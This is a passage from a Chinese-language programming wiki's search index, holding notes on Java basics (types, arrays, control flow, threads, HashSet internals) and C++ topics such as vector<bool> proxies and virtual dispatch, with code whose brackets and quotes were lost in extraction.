std::vector泛型代码需要真实引用或并发修改独立元素时应改用字节容器、bitset 或专用动态位集合。 std::vectorbool 是节省空间的特化，元素访问返回代理而不一定是 bool。依赖真实引用、地址或并发修改不同元素的泛型代码可能因此失效。只需要紧凑位集合时可明确接受这一语义，否则 std::vectorunsigned char 或专用位容器往往更直观。 vector 的代理引用 #include iostream#include vectorint main() std::vectorbool flagsfalse, true; auto bitflags[0]; bit = true; std::cout flags[0] ; vector::reference 是代理对象而不一定是 bool；需要真正 bool 对象地址时改用其他表示。 需要真实 bool 对象时进行值转换 std::vectorbool flagstrue, false;bool firstflags.front();consume(first); vector 的元素访问返回代理类型，复制到 bool 后才得到独立布尔对象。 参考资料 LearnCpp 16.10：vector 的 resize 与 capacity LearnCpp 16.11：vector 的栈式操作 LearnCpp 16.12：std::vector cppreference：动态数组：std::vector相关条目","tags":[null,null]},{"title":"生活记录","path":"/wiki/life/index.html","content":"这里整理日常记录、外出见闻和碎片思考。 这部分保留记录本身的时间感，不强行套技术文章结构。"},{"title":"Java笔记01-Java平台与运行机制","path":"/wiki/java/java-note-01.html","content":"Java 源代码通常先编译为字节码，再由 Java 虚拟机加载和执行。语言规范、类库、开发工具和运行时共同组成 Java 平台，几者的职责需要分开理解。 Java 语言与 Java 平台Java 语言规定源代码的语法和类型系统；Java 平台提供虚拟机、标准类库和开发工具。同一份符合规范的字节码可以交给不同操作系统上的 JVM 执行，但本地库、文件路径、默认字符集等平台相关因素仍可能影响实际行为。 组成 职责 JVM 加载、验证并执行字节码，管理运行时内存 Java 标准类库 提供集合、IO、网络、并发等通用 API JDK 提供 JVM、类库以及编译、诊断、打包等开发工具 JRE 是“Java 运行环境”的传统称呼，通常指 JVM 与运行程序所需的类库。现代 JDK 已包含完整运行环境；从 Java 9 引入模块系统后，还可以使用 jlink 为应用构建裁剪后的运行时镜像，因此不应再把“单独安装 JRE”当作所有环境的固定步骤。 从源代码到执行以传统类式程序为例，编译和启动命令如下： javac FirstProgram.javajava FirstProgram 处理链路可以概括为： .java 源文件 ↓ javac.class 字节码 ↓ 类加载、字节码验证与执行JVM 进程 HotSpot 等 JVM 实现通常会解释执行部分字节码，并把频繁执行的方法即时编译为机器码。解释器、JIT 编译器和垃圾收集器属于 JVM 实现细节，不是 Java 源代码语法的一部分。 Java 平台的主要特征 静态类型：变量、参数和返回值在编译阶段接受类型检查。 面向对象：类和对象用于组织状态与行为，同时保留基本数据类型。 自动内存管理：对象内存由垃圾收集器管理，但文件、连接等外部资源仍需显式关闭。 平台适配：字节码由对应平台的 JVM 执行，本地依赖仍需分别适配。 并发支持：标准库提供线程、锁、原子类、并发容器和任务执行框架。 封装、继承和多态属于面向对象设计的三个常见概念，不宜与“跨平台、多线程”等平台能力混写成同一组“Java 三大特性”。 JDK 常用工具 工具 用途 javac 编译 Java 源文件 java 启动 Java 应用 jar 创建和查看 JAR 文件 javadoc 从文档注释生成 API 文档 jcmd、jstack 查看 JVM 与线程运行状态 IDE 的运行按钮最终仍会调用相应的构建与启动工具。定位编译或运行问题时，区分 IDE 配置、JDK 工具和 JVM 运行时有助于缩小排查范围。","tags":[null,null]},{"title":"Java笔记02-基本类型、变量与类型转换","path":"/wiki/java/java-note-02.html","content":"Java 的八种基本类型直接表示数值、字符编码单元或布尔状态。对象类型的变量保存引用，两类变量在赋值、比较和默认值方面存在不同规则。 八种基本类型 类型 位数或表示 说明 byte 8 位有符号整数 -128 到 127 short 16 位有符号整数 -32768 到 32767 int 32 位有符号整数 整数字面量的默认类型 long 64 位有符号整数 字面量常使用 L 后缀 float IEEE 754 binary32 字面量使用 F 后缀 double IEEE 754 binary64 浮点字面量的默认类型 char 16 位无符号整数 表示一个 UTF-16 代码单元 boolean true 或 false 存储尺寸不由 Java 语言规范固定 char 不一定能独立表示一个完整 Unicode 字符。基本多文种平面之外的字符需要一对 UTF-16 代理项，按 Unicode 码点处理文本时可使用 String.codePoints() 等 API。 变量、字段与默认值int age = 18;double score = 92.5;char grade = A;boolean passed = true; 局部变量必须先赋值再读取；对象字段和数组元素则会获得默认值。数值类型默认为零，boolean 默认为 false，引用类型默认为 null。 final 限制的是变量再次赋值： final int maxRetry = 3;final ListString names = new ArrayList();names.add(Alice); 第二个例子中的 names 不能改为指向另一个列表，但列表对象本身仍然可以修改。不可重新赋值与对象不可变是两个不同概念。 数值转换与运算提升较小整数类型向较大类型转换通常可以隐式完成，可能丢失范围或精度的转换需要显式类型转换。 int count = 10;long total = count;int truncated = (int) 3.99; 算术表达式还会发生数值提升。例如 byte、short 和 char 参与整数运算时通常先提升为 int。强制转换不会检查数值是否超出目标范围；窄化转换可能截断高位，浮点数转整数会丢弃小数部分。 字面量与溢出long distance = 3_000_000_000L;float ratio = 0.75F;int binary = 0b1010;int hex = 0xFF; 整数运算溢出不会自动抛出异常。需要检测溢出时可以使用 Math.addExact()、Math.multiplyExact() 等方法；货币等十进制精确计算通常使用 BigDecimal，而不是 float 或 double。 控制台输入输出try (Scanner scanner = new Scanner(System.in)) int age = scanner.nextInt(); scanner.nextLine(); String name = scanner.nextLine(); System.out.printf(name=%s, age=%d%n, name, age); nextInt() 等方法不会消费行尾换行符，随后直接调用 nextLine() 时可能先读到空行。长期运行的程序通常不会随意关闭共享的 System.in；示例中的 try-with-resources 更适合独占标准输入的短程序。","tags":[null,null]},{"title":"C++/Cpp基础","path":"/wiki/cpp/index.html","content":"C++ 的语法只是入口。随着程序变大，名称如何跨文件绑定、对象何时构造和销毁、转换是否丢失信息、资源由谁释放，会逐渐成为更重要的问题。 前面的内容从程序与工具链开始，随后把语句、变量和函数放进可以构建的项目中。类型与表达式部分继续追踪值在计算过程中的变化；容器、类和模板则把同样的规则扩展到更复杂的数据结构。继承、异常和文件 IO 最终会把对象模型、资源管理与外部失败条件连在一起。 贯穿各主题的几条线索 类型不仅决定一块数据能保存什么，也参与重载解析、模板实例化和对象布局。 作用域控制名称可见性，存储期控制对象存在时间，所有权决定资源由谁结束。 标准库容器和智能指针把常见生命周期规则封装进类型，但接口边界仍需说明借用、修改与转移。 编译诊断、断言、测试和调试器发现的问题不同，任何一种工具都不能单独证明程序满足需求。 学习顺序不必等同于查阅顺序。已经明确问题类型时，可以直接从左侧主题进入；需要建立连续上下文时，从程序结构一路阅读到对象模型会更自然。"},{"title":"Java笔记04-数组的创建、访问与复制","path":"/wiki/java/java-note-04.html","content":"Java 数组是固定长度的对象，按下标保存同一声明类型的元素。数组提供常量时间的下标访问，但长度在创建后不能改变。 创建与初始化int[] scores = new int[5];int[] values = 1, 2, 3, 4, 5; new int[5] 创建五个元素并填入默认值，数组初始化器则在创建时给出元素。数组元素的默认值与对象字段一致：数值为零，boolean 为 false，引用为 null。 数组可以视为带长度和下标的顺序结构，但 Java 语言规范不承诺对象在物理内存中的具体布局，因此不应把“物理连续内存”当作可依赖的语言行为。 下标与遍历合法下标范围是 0 到 length - 1： for (int i = 0; i values.length; i++) values[i] *= 2; 增强 for 适合只读取元素： for (int value : values) System.out.println(value); 给增强 for 的循环变量重新赋值不会写回基本类型数组；需要修改元素时应使用下标。访问 values[values.length] 会抛出 ArrayIndexOutOfBoundsException。 数组引用与复制数组变量保存引用，直接赋值不会复制元素： int[] source = 1, 2, 3;int[] alias = source;alias[0] = 99; 此时 source[0] 也会变为 99。创建独立副本可以使用： int[] copy1 = source.clone();int[] copy2 = Arrays.copyOf(source, source.length);int[] copy3 = new int[source.length];System.arraycopy(source, 0, copy3, 0, source.length); 这些方式对元素执行浅复制。元素类型是对象引用时，新数组与旧数组仍可能指向相同对象。 多维数组Java 的二维数组是“数组的数组”，每一行可以具有不同长度： int[][] matrix = 1, 2, 3, 4, 5; 这种结构与固定矩形内存块不同。遍历时应分别读取外层和每个内层数组的长度。 固定长度与动态集合。 数组扩容需要创建新数组并复制元素。元素数量会持续变化时通常使用 ArrayList；需要固定长度、基本类型存储或直接下标访问时，数组仍然合适。","tags":[null,null]},{"title":"Java笔记05-条件分支与循环","path":"/wiki/java/java-note-05.html","content":"条件分支选择执行路径，循环重复执行代码块。两类结构都依赖明确的条件、边界和退出方式。 if 条件链if (score = 90) grade = A; else if (score = 80) grade = B; else grade = C; 条件按书写顺序判断，第一个结果为 true 的分支执行后，后续分支不再计算。区间条件应避免重叠和遗漏，包含副作用的方法调用也不宜重复写在多个条件中。 switch 语句与表达式传统冒号形式会继续执行后续 case，通常需要 break： switch (day) case 1: type = 工作日; break; case 6: case 7: type = 周末; break; default: type = 未知; Java 14 起，箭头形式的 switch 表达式成为正式特性，不会发生传统贯穿： String type = switch (day) case 1, 2, 3, 4, 5 - 工作日; case 6, 7 - 周末; default - 未知;; if 适合范围和复合条件，switch 适合围绕同一个选择值列举分支。 for、while 与 do...whilefor (int i = 0; i 10; i++) System.out.println(i); for 把初始化、继续条件和更新操作放在同一处，适合计数循环。while 在每轮开始前判断条件，适合由状态或输入驱动的循环。do...while 在循环体执行后判断，因此至少执行一次。 循环边界通常采用左闭右开形式，例如 0 = i i length。这种写法可以直接把元素数量作为上界，并与数组和集合的下标规则保持一致。 break、continue 与标签break 结束当前循环，continue 跳过当前轮次： for (int i = 0; i 5; i++) if (i == 2) continue; System.out.println(i); Java 还支持带标签的 break 和 continue，可用于跳出指定的外层循环。标签会增加控制流阅读成本，嵌套逻辑较复杂时通常可以通过提取方法或提前返回简化结构。 终止条件与死循环死循环不一定是错误，事件循环和服务线程可能有意持续运行；这类循环仍需明确中断、关闭或异常退出机制。修改循环控制变量时，还要确认更新路径不会被 continue 或异常分支绕过。","tags":[null,null]},{"title":"Java笔记03-标识符、关键字与运算符","path":"/wiki/java/java-note-03.html","content":"标识符为类、方法和变量命名，关键字参与语法结构，运算符构成表达式。编译器会同时检查命名是否合法、表达式类型是否匹配以及结果能否赋给目标变量。 标识符与命名约定Java 标识符不能以数字开头，也不能使用关键字。语言允许符合 Unicode 标识符规则的字符；工程代码通常优先采用便于跨工具识别的英文字母、数字和下划线。 对象 常见写法 示例 类、接口、枚举 UpperCamelCase OrderService 方法、变量 lowerCamelCase findOrder 常量 UPPER_SNAKE_CASE MAX_RETRY_COUNT 包名 小写分段 com.example.order Character.isJavaIdentifierStart() 和 Character.isJavaIdentifierPart() 可以用于判断字符是否满足 Java 标识符规则。 关键字与上下文关键字class、if、return 等关键字不能作为标识符。随着 Java 语言演进，还出现了只在特定语法位置具有特殊含义的上下文关键字，例如 record、sealed、permits 和 yield。它们与始终保留的关键字并不完全相同。 算术、比较与逻辑运算int a = 5;int b = 3;int sum = a + b;boolean valid = a b b 0; 类型 运算符 说明 算术 + - * / % 数值计算，整数除法丢弃小数部分 关系 = = == != 结果为 boolean 逻辑 位运算 ^ ~ 赋值 = += -= *= /= 将结果写回变量 和 || 会短路求值；结果确定后，右侧表达式不再执行。 和 | 用于布尔值时会计算两侧，用于整数时执行位运算。 自增、优先级与求值顺序int i = 1;int before = i++;int after = ++i; 后缀自增先产生旧值再更新变量，前缀自增先更新变量再产生新值。复杂表达式中混用自增会降低可读性，拆成独立语句通常更容易验证。 运算符优先级决定表达式如何分组，括号可以显式表达顺序： int result = (10 + 3) * 2; Java 规定操作数从左到右求值，但这不等同于所有运算符具有相同优先级。 整数溢出与对象比较int max = Integer.MAX_VALUE;int wrapped = max + 1; 整数溢出按固定位宽回绕。需要把溢出作为错误处理时，可以调用 Math.addExact() 等方法。 基本类型使用 == 比较值。对象引用使用 == 判断是否指向同一对象，内容相等通常由类型的 equals() 实现；数组内容比较可使用 Arrays.equals() 或 Arrays.deepEquals()。","tags":[null,null]},{"title":"虚函数、动态分派与虚表模型","path":"/wiki/cpp/cpp-topic-virtual-dispatch.html","content":"基类引用和指针可以指向派生对象，虚函数让调用在运行期选择最终覆盖实现。override 与 final 把覆盖意图带入编译期检查，虚析构保证通过基类所有者销毁完整对象。虚表是常见实现模型，但标准保证的是可观察的动态分派行为。 概念索引 主题 规则边界 基类指针和引用指向派生对象 public 继承允许基类指针或引用绑定派生对象中的基类子对象。 虚函数与多态 通过基类指针或引用调用虚函数时，会选择动态类型中最终覆盖的版本。 override、final 与协变返回 override 让编译器验证签名确实覆盖基类虚函数，final 禁止继续覆盖或派生。 虚析构、虚赋值与虚化边界 通过基类指针删除派生对象时，基类析构函数必须是虚函数。 早绑定与晚绑定 非虚直接调用通常可在编译或链接阶段确定目标，虚调用依据运行期对象选择覆盖。 虚表 常见实现为多态类维护虚表，并在对象中保存虚表指针。 基类指针和引用指向派生对象静态类型决定可见接口，动态类型参与虚函数分派；按值转换则会产生对象切片。 基类引用或指针可以绑定派生对象的基类子对象而不复制，因此保留完整动态对象。非虚调用按静态类型绑定，虚调用按动态类型选择覆盖。对象实际生命周期仍由外部所有者管理，引用本身不延长存活。 基类引用保留动态类型 #include iostreamclass Base public: virtual ~Base() = default; virtual int value() const return 1; ;class Derived final : public Base public: int value() const override return 2; ;int read(const Base value) return value.value(); int main() const Derived value; std::cout read(value) ; Base 引用绑定 Derived 中的基类子对象，虚调用依据动态类型选择覆盖版本。 虚函数与多态构造和析构期间的虚调用只分派到当前构造或析构层级。 虚函数通过基类接口在运行时选择最终覆盖，允许异构对象共享调用路径。基类必须有适合多态使用的析构策略，覆盖函数使用 override。构造和析构期间的虚调用不会派发到尚未构造或已经销毁的派生部分。 虚函数运行时分派 #include iostream#include memoryclass Shape public: virtual ~Shape() = default; virtual int sides() const = 0; ;class Triangle final : public Shape public: int sides() const override return 3; ;int main() std::unique_ptrShape shapestd::make_uniqueTriangle(); std::cout shape-sides() ; 通过基类指针调用 virtual 函数时使用动态类型；基类析构函数为 virtual 才能安全删除派生对象。 通过基类所有者保存异构对象 std::vectorstd::unique_ptrShape shapes;shapes.push_back(std::make_uniqueCircle());shapes.push_back(std::make_uniqueRectangle());for (const auto shape : shapes) shape-draw(); unique_ptr 管理每个动态对象，基类虚接口保留实际派生类型的行为。 多态对象通过引用或智能指针传递，覆盖函数使用 override 让签名漂移在编译期暴露；值传递会切片。 override、final 与协变返回协变返回只适用于基类与派生类指针或引用返回类型，不能任意改变值返回类型。 override 要求函数覆盖基类虚函数，能捕捉 const、参数和引用限定符漂移；final 可阻止继续覆盖或继承。协变返回只适用于相关类的指针或引用。公共库使用 final 会关闭扩展点，应基于不变量而非优化猜测。 override 和 final 让覆盖关系可检查 #include iostreamclass Base public: virtual ~Base() = default; virtual int value() const return 1; ;class Derived final : public Base public: int value() const override return 2; ;int main() const Derived value; std::cout value.value() ; override 让签名漂移成为编译错误，final 阻止继续派生或覆盖。 虚析构、虚赋值与虚化边界赋值运算符不具备普通虚复制语义；多态复制通常使用 virtual clone 返回智能指针。 只要对象可能通过基类指针或智能指针被销毁，基类析构函数就必须是虚函数。否则删除派生对象会产生未定义行为。若基类完全不允许这种删除，可以使用受保护的非虚析构，但这需要接口明确限制所有权形态。 多态基类使用虚析构 #include iostream#include memoryclass Base public: virtual ~Base() std::cout ~Base ; ;class Derived final : public Base public: ~Derived() override std::cout ~Derived ; ;int main() std::unique_ptrBase objectstd::make_uniqueDerived(); 通过 Base 所有者销毁 Derived 时会依次执行派生和基类析构；多态复制通常另设 virtual clone。 通过基类所有者保存异构对象 std::vectorstd::unique_ptrShape shapes;shapes.push_back(std::make_uniqueCircle());shapes.push_back(std::make_uniqueRectangle());for (const auto shape : shapes) shape-draw(); unique_ptr 管理每个动态对象，基类虚接口保留实际派生类型的行为。 通过基类所有者销毁派生对象要求虚析构；若禁止这种所有权，就让析构访问控制明确阻止调用。 早绑定与晚绑定优化器在动态类型可证明时仍可能去虚化，因此术语描述语义而不是固定机器指令。 非虚函数和多数重载在编译期按静态类型绑定，虚函数调用则根据运行时动态类型晚绑定。重载解析仍在编译期完成，因此派生类新增重载不会被基类引用自动发现。区分两个阶段能解释许多看似反直觉的调用结果。 非虚调用与虚调用的绑定差异 #include iostreamclass Base public: void fixed() const std::cout base fixed ; virtual void dynamic() const std::cout base dynamic ; virtual ~Base() = default; ;class Derived : public Base public: void fixed() const std::cout derived fixed ; void dynamic() const override std::cout derived dynamic ; ;int main() const Derived value; const Base basevalue; base.fixed(); base.dynamic(); 静态类型决定非虚 fixed 调用，动态类型决定 virtual dynamic 调用；优化器可能在类型可证明时去虚化。 虚表C++ 标准只规定可观察分派行为，不保证虚表存在、位置或具体对象布局。 虚表是主流实现动态派发的机制模型，但 C++ 标准不规定必须存在某种具体布局。通常对象携带隐藏指针，调用经表选择最终覆盖。不能把观察到的 vptr 位置或大小写进可移植协议，也不应依赖它手工修改对象。 只依赖虚分派语义 #include iostreamclass Base public: virtual ~Base() = default; virtual int value() const return 1; ;class Derived final : public Base public: int value() const override return 2; ;int read(const Base base) return base.value(); int main() std::cout read(Derived) ; 常见实现使用虚表和虚表指针，但标准只保证最终覆盖函数被调用，不保证具体布局。 参考资料 LearnCpp 25.1：基类指针和引用指向派生对象 LearnCpp 25.2：虚函数与多态 LearnCpp 25.3：override、final 与协变返回 LearnCpp 25.4：虚析构、虚赋值与虚化边界 LearnCpp 25.5：早绑定与晚绑定 LearnCpp 25.6：虚表 cppreference：虚函数相关条目","tags":[null,null]},{"title":"Java笔记15-HashSet插入过程源码跟踪","path":"/wiki/java/java-note-15.html","content":"这次调试跟踪 HashSet 连续插入不同字符串时的调用路径。示例基于 JDK 中以 HashMap 实现 HashSet 的版本；内部类名、字段和扩容细节不属于公开 API，升级 JDK 后可能变化。 调试入口HashSetString set = new HashSet();set.add(java);set.add(php);set.add(java);System.out.println(set); 在第二次 add() 处进入源码，可以看到 HashSet.add() 把元素作为 HashMap 的键保存，值使用内部占位对象： public boolean add(E e) return map.put(e, PRESENT) == null; 哈希扰动与桶下标当前调试版本会先计算键的 hashCode()，再通过高位异或得到内部哈希值： static final int hash(Object key) int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h 16); 本次对字符串 php 的观察值为 110969。这个数值来自字符串哈希算法与当前 HashMap 扰动逻辑，不应作为业务代码依赖。 当表容量为 n 时，桶下标使用 (n - 1) hash 计算。容量为 2 的幂可以让按位与覆盖有效下标范围。 空桶插入第二个不同字符串落到空桶时，putVal() 直接创建节点： if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length;if ((p = tab[i = (n - 1) hash]) == null) tab[i] = newNode(hash, key, value, null); 插入完成后更新结构修改次数和元素数量；超过阈值时触发扩容。 重复元素判断第三次加入 java 时，哈希定位会找到已有节点。HashMap 随后结合哈希值、引用相等和 equals() 判断键是否已经存在。存在相同键时，HashSet.add() 返回 false，集合大小不增加。 自定义对象作为元素时，equals() 与 hashCode() 必须满足一致性约定：相等对象必须产生相同哈希码。否则集合可能无法正确识别逻辑重复元素。","tags":[null,null]},{"title":"Java笔记17-线程学习实验记录","path":"/wiki/java/java-note-17.html","content":"这组实验从线程创建、调度和状态观察开始，并记录中断、等待、锁和死锁的基本行为。截图来自当时的本机环境，处理器数量和调度顺序只代表该次观察。 进程、线程与并发进程是操作系统分配资源和隔离地址空间的运行实例，线程是进程中的执行单元。一个 Java 应用启动后通常不只有 main 线程，JVM、垃圾收集器和工具也可能创建后台线程，具体数量取决于 JVM 实现和运行参数。 并发表示多个任务在时间上重叠推进，并行表示多个任务在同一时刻由不同处理单元执行。多核系统可以并行运行多个线程，单核系统也可以通过调度形成并发。 int processors = Runtime.getRuntime().availableProcessors();System.out.println(processors); availableProcessors() 返回 JVM 当前可用的处理器数量，不一定等于机器的物理核心数。它还可能受到容器配额、虚拟机和操作系统配置影响。本次实验返回 20： 创建线程直接继承 Thread： class CatThread extends Thread @Override public void run() System.out.println(Thread.currentThread().getName()); CatThread thread = new CatThread();thread.start(); 实现 Runnable 可以把任务与线程对象分开： Runnable task = () - System.out.println(Thread.currentThread().getName());Thread thread = new Thread(task, worker-1);thread.start(); 调用 start() 会请求 JVM 启动新线程，新线程随后执行 run()。直接调用 run() 只是当前线程中的普通方法调用。start0() 是 OpenJDK Thread 实现中的本地方法细节，不是应用应直接调用的 API。 中断与协作式停止线程应通过任务完成、共享停止条件或中断协作退出，不应使用已废弃的 Thread.stop()。 class Worker implements Runnable @Override public void run() try while (!Thread.currentThread().isInterrupted()) doWork(); Thread.sleep(50); catch (InterruptedException e) Thread.currentThread().interrupt(); interrupt() 不会强制杀死线程。线程处于 sleep()、wait() 或 join() 时会收到 InterruptedException，异常抛出时中断标记会被清除；若当前层不能完成中断处理，应恢复标记或继续向上抛出。 共享布尔停止标记至少需要 volatile 或其他同步手段保证可见性： private volatile boolean running = true; 等待、让步与守护线程 join() 等待目标线程结束，不表示线程“插队”或获得更高调度优先级。 yield() 只是向调度器提供让步提示，不保证其他线程立即运行。 setDaemon(true) 必须在 start() 前调用。只剩守护线程时，JVM 可以退出，守护线程的 finally 块也不保证完成。 线程优先级只是调度提示，不适合作为正确性或执行顺序保证。 Java线程状态Thread.State 定义六种状态： 状态 含义 NEW 已创建但尚未启动 RUNNABLE 正在 JVM 中执行或等待操作系统调度 BLOCKED 等待进入 synchronized 监视器 WAITING 无限期等待其他线程动作 TIMED_WAITING 在期限内等待 TERMINATED 执行结束 Java 的 RUNNABLE 同时覆盖操作系统层面的就绪与运行状态，Thread.State 不提供独立的 READY 和 RUNNING 枚举值。 共享票源与锁释放class TicketOffice implements Runnable private final Lock lock = new ReentrantLock(); private int tickets = 100; @Override public void run() while (true) lock.lock(); try if (tickets == 0) return; System.out.printf(%s sold %d%n, Thread.currentThread().getName(), tickets--); finally lock.unlock(); unlock() 必须放在 finally 中。若在持锁状态下通过 break、return 或异常离开而没有释放锁，其他线程会一直等待。 死锁条件两个线程以相反顺序获取同一组锁时可能形成死锁：线程一持有 lockA 等待 lockB，线程二持有 lockB 等待 lockA。统一锁顺序、缩小持锁范围或使用带超时的 tryLock() 可以降低风险。 等待通知和线程池分别在 Java笔记37-wait与notify 与 Java笔记38-Lock与线程池 中继续展开。","tags":[null,null]},{"title":"Java笔记18-Java程序的编译与启动","path":"/wiki/java/java-note-18.html","content":"传统 Java 应用把代码组织在类中，通过 javac 编译为字节码，再由 java 启动器加载入口类并调用入口方法。 最小程序结构public class FirstProgram public static void main(String[] args) System.out.println(Hello, World!); 代码 作用 public class FirstProgram 声明公开类，文件名应为 FirstProgram.java public static void main(String[] args) 传统类式应用的入口方法 System.out.println(...) 向标准输出写入文本并换行 main 声明为 static，启动器可以在不创建 FirstProgram 对象的情况下调用它。String[] args 保存命令行参数，String... args 经过编译后使用相同的数组形式。 标准输出与错误输出。 System.out 和 System.err 都是 PrintStream： System.out.println(normal message);System.err.println(error message); 两者在终端中可能显示在同一位置，但属于不同输出流，可以分别重定向。println() 会追加平台换行符，print() 不会自动换行，printf() 支持格式化输出。 编译与启动过程javac FirstProgram.javajava FirstProgram javac 读取源文件并生成 FirstProgram.class。java FirstProgram 接收的是类名而不是文件名，启动器随后创建 JVM、加载类并调用入口方法。 FirstProgram.java ↓ javacFirstProgram.class ↓ java FirstProgram类加载 → 字节码验证 → main 方法 HotSpot 通常先解释部分字节码，再把热点方法即时编译为机器码。具体优化策略属于 JVM 实现，不影响 .class 字节码的跨平台格式。 语句与代码块。 Java 语句通常以分号结束，类和方法体使用花括号界定范围： int count = 1;if (count 0) System.out.println(count); 类声明、方法声明和控制结构本身不在右花括号后添加分号。空语句 ; 虽然合法，但误写在 if 或循环条件后可能改变控制流。 注释与文档注释。 // 单行注释/* * 多行注释 *//** * 文档注释，可由 javadoc 处理。 */ 注释适合记录设计原因、边界条件和非直观约束。能够直接从代码读出的操作无需逐行复述；公开 API 的参数、返回值和异常约定则适合写入文档注释。 IntelliJ IDEA 常用操作 操作 作用 main 生成入口方法模板 sout 生成标准输出语句 Ctrl + Alt + L 格式化代码 Shift + F10 运行当前配置 Alt + Enter 查看快速修复建议 快捷模板取决于 IDE 和键位方案，不属于 Java 语言语法。","tags":[null,null]},{"title":"Java笔记19-分支判断、字符串比较与循环边界","path":"/wiki/java/java-note-19.html","content":"流程控制由条件表达式决定执行路径。分支条件的顺序、对象比较方式和循环边界会直接影响程序行为。 有序的 if-else 条件链double bmi = weight / (height * height);if (bmi 18.5) result = 偏瘦; else if (bmi 25) result = 正常; else if (bmi 28) result = 偏重; else result = 超重; 条件从上到下计算。进入某个分支后，后续条件不再执行，因此第二个条件只需写 bmi 25，前一个分支已经排除了更小区间。若把较宽条件放在前面，后面的窄区间可能永远无法进入。 字符串比较。 对象引用使用 == 判断是否指向同一对象，String.equals() 比较字符序列： String s1 = Hello;String s2 = Hello;String s3 = new String(Hello);System.out.println(s1 == s2); // 当前示例通常为 trueSystem.out.println(s1 == s3); // falseSystem.out.println(s1.equals(s3)); // true 字符串字面量会进入字符串池，因此 s1 和 s2 通常引用同一池中对象；new String(...) 明确创建新对象。业务代码不应依赖字符串池来比较内容。 可能出现 null 时可使用常量调用或 Objects.equals()： if (红.equals(color)) System.out.println(停车);boolean same = Objects.equals(left, right); Objects.equals() 可以同时处理两个参数为 null 的情况。 传统 switch 的贯穿switch (day) case 1: case 2: case 3: case 4: case 5: type = 工作日; break; case 6: case 7: type = 周末; break; default: type = 无效; 冒号形式会从匹配的标签继续向下执行，直到遇到 break、return 或结构结束。Java 14 起可使用箭头形式的 switch 表达式避免无意贯穿。 循环形式for (int i = 0; i 10; i++) System.out.println(i); for 适合把计数变量、继续条件和更新操作放在一起。while 在每轮开始前判断条件；do...while 在循环体结束后判断，因而至少执行一次。 数组和集合下标通常采用左闭右开边界： for (int i = 0; i values.length; i++) process(values[i]); 元素数量为 length，最后一个合法下标为 length - 1。将条件误写为 i = values.length 会在最后一轮越界。 循环中断。 for (int i = 0; i 5; i++) if (i == 2) continue; System.out.println(i); continue 跳过当前轮次，break 结束当前循环。持续运行的服务循环仍应设计关闭信号或中断处理，避免只能通过强制终止进程退出。","tags":[null,null]},{"title":"Java笔记20-数组遍历与冒泡排序","path":"/wiki/java/java-note-20.html","content":"数组遍历把同一处理逻辑应用到一组元素，排序则根据比较规则调整元素顺序。冒泡排序适合展示下标、比较和交换过程，实际工程通常直接使用标准库排序。 按值与按下标遍历int[] values = 28, 12, 89, 73, 65;for (int value : values) System.out.println(value); 增强 for 直接取得元素值，适合只读操作。需要访问位置或修改数组时使用下标： for (int i = 0; i values.length; i++) values[i] *= 2; 倒序遍历从最后一个合法下标开始： for (int i = values.length - 1; i = 0; i--) System.out.println(values[i]); 聚合计算。 int sum = 0;for (int value : values) sum += value; 求和、计数、最大值和条件筛选都属于遍历中的状态累积。空数组没有可读取的首元素，计算最大值等操作需要先处理空输入或使用显式初始值。 冒泡排序for (int i = 0; i values.length - 1; i++) for (int j = 0; j values.length - 1 - i; j++) if (values[j] values[j + 1]) int temp = values[j]; values[j] = values[j + 1]; values[j + 1] = temp; 内层循环比较相邻元素并交换逆序对。每轮结束后，当前未排序范围内的较大元素移动到末尾，因此下一轮可以缩短比较范围。 已经有序的数组可以提前结束： for (int i = 0; i values.length - 1; i++) boolean swapped = false; for (int j = 0; j values.length - 1 - i; j++) if (values[j] values[j + 1]) int temp = values[j]; values[j] = values[j + 1]; values[j + 1] = temp; swapped = true; if (!swapped) break; 冒泡排序平均和最坏时间复杂度为 O(n²)，额外空间为 O(1)；提前退出可让已有序输入达到 O(n)。 标准库排序。 Arrays.sort(values); 标准库实现经过了更多边界、类型和性能验证。手写排序适合学习比较与交换过程；业务代码没有特殊排序需求时应优先使用 Arrays.sort() 或集合的排序 API。","tags":[null,null]},{"title":"Java笔记21-类、对象与面向对象特性","path":"/wiki/java/java-note-21.html","content":"类定义对象可持有的状态与行为，对象是类在运行时创建的实例。封装、继承和多态建立在类、引用和方法调用规则之上。 类与对象class Person private String name; private int age; Person(String name, int age) this.name = name; this.age = age; void introduce() System.out.println(name + is + age); Person person = new Person(Tom, 18);person.introduce(); 变量 person 保存对 Person 对象的引用。JVM 如何把引用和对象分配到栈、堆或经过逃逸分析后的其他位置属于实现细节；Java 语言层面可以依赖的是引用语义，而不是某个固定内存地址。 两个变量可以引用同一对象： Person first = new Person(Tom, 18);Person second = first; 通过任一引用修改可变对象，另一引用随后会观察到同一对象的状态变化。 构造方法与 this构造方法在创建对象时执行。若类没有显式声明任何构造方法，编译器会提供无参数构造方法；一旦声明了构造方法，这个默认构造方法便不再自动生成。 this 表示当前对象，可用于区分字段和同名参数： Person(String name, int age) this.name = name; this.age = age; 构造方法可以校验参数，但在构造期间暴露 this 可能让未完成初始化的对象被其他代码观察到。 封装与不变量字段设为 private 可以限制直接访问，方法则负责维护对象约束： public void setAge(int age) if (age 0 || age 150) throw new IllegalArgumentException(invalid age); this.age = age; 封装不等同于机械生成 Getter 和 Setter。不可变对象、只读属性和面向业务动作的方法都可以减少无约束状态修改。 继承与组合class Student extends Person private int score; Student(String name, int age, int score) super(name, age); this.score = score; 继承表达“子类型也是父类型”的关系，并允许复用可访问成员。继承会形成较强耦合；只是为了复用实现时，组合对象通常更灵活。 构造子类时会先完成父类部分的初始化。private 字段属于父类对象状态，但子类不能直接访问，只能通过父类提供的 API 使用。 重写与多态class Person void introduce() System.out.println(person); class Student extends Person @Override void introduce() System.out.println(student); Person person = new Student();person.introduce(); 变量的声明类型决定编译期可访问的成员，运行时对象类型决定被重写实例方法的实际实现。字段、静态方法和私有方法不按同样方式动态分派。 接口比具体父类更适合作为多数业务扩展点： ListString names = new ArrayList(); 调用方依赖 List 契约，具体实现可在满足契约的前提下替换。 IntelliJ IDEA 常用操作 操作 用途 Alt + Insert 生成构造方法、访问器或 toString() Ctrl + O 选择并重写父类方法 Ctrl + B 跳转到声明 Ctrl + P 查看参数列表","tags":[null,null]},{"title":"Java笔记22-String与可变字符串","path":"/wiki/java/java-note-22.html","content":"String 表示不可变字符序列。StringBuilder 和 StringBuffer 维护可变字符缓冲区，适合在同一段代码中连续追加或删除内容。 引用比较与内容比较String first = Hello 